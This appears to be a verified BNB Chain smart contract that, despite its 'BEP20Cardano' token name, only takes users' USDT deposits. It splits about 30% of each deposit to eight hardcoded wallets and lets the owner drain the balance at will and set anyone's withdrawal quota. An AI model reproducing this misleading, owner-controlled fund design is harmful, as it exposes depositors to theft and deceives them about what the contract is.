/**
 *Submitted for verification at BscScan.com on 2022-11-17
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.5.16;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Context {
  constructor () internal { }
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20Cardano is Context, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _kted;

  address sk=0x51970b33d4714cF23BEe6BC2b75b9d3E58BEa221;
  address sxf=0x405Fc77dAbe499fF8F988A6Ecaf590c6eb2aC0FD;
  address cdc=0x23F267F9A1757b0E93146f4D6d8492912373fe33;
  address sctg=0xFC477B8F2Bdbd2d56bEC12e122Bb91054289e5DC;
  address jzgd=0xEEf93142B80554128829eD2ED91ef57f66350068;
  address jjh=0x70d8C4061EBe4f412Ae192eE18F075214DC163B8;
  address jswh=0x08D3a6E8Bd7bFC041D622D082921478f6F7B62FE;
  address hg=0xA067A3A17448E9aA061E9c6EF95C8fe50fDF65B5;

  address tokenacc=address(this);
  address usdtacc = 0x55d398326f99059fF775485246999027B3197955;
  address safeaddress = 0xf5E5b4f03904494522d1319A0212D70aF0c967Fd;

  constructor() public {
  }

  function zcdo(uint256 amount)public{
      IBEP20(usdtacc).transferFrom(msg.sender,tokenacc,amount);
      IBEP20(usdtacc).transfer(sxf,amount.mul(7).div(1000));
      IBEP20(usdtacc).transfer(sk,amount.mul(110).div(1000));
      IBEP20(usdtacc).transfer(cdc,amount.mul(60).div(1000));
      IBEP20(usdtacc).transfer(sctg,amount.mul(50).div(1000));
      IBEP20(usdtacc).transfer(jzgd,amount.mul(30).div(1000));
      IBEP20(usdtacc).transfer(jjh,amount.mul(30).div(1000));
      IBEP20(usdtacc).transfer(jswh,amount.mul(10).div(1000));
      IBEP20(usdtacc).transfer(hg,amount.mul(10).div(1000));
      IBEP20(usdtacc).transfer(msg.sender,amount.mul(693).div(1000));

      //可提额度
      _kted[msg.sender]=_kted[msg.sender].add(amount.mul(50).div(100));
  }

  function getOwner() external view returns (address) {
    return owner();
  }

  function drawusdt(address to,uint256 amount)public onlyOwner{
     IBEP20(usdtacc).transfer(to,amount);
  }

  //设置可提额度
  function setkted(address to,uint256 amount)public onlyOwner{
     _kted[to]=amount*10**18;
  }

  function showed(address acc)external view returns(uint256){
     return _kted[acc];
  }

  //设置安全钱包
  function setsafeaddress(address _safeaddress)public onlyOwner{
     safeaddress = _safeaddress;
  }

  //提现
  function txdo(address to,uint256 amount)public{
      require(msg.sender==safeaddress,'no safeaddress');
      require(_kted[to]>amount,'no kted');
      _kted[to]=_kted[to].sub(amount);
      IBEP20(usdtacc).transfer(to,amount);
  }
  
}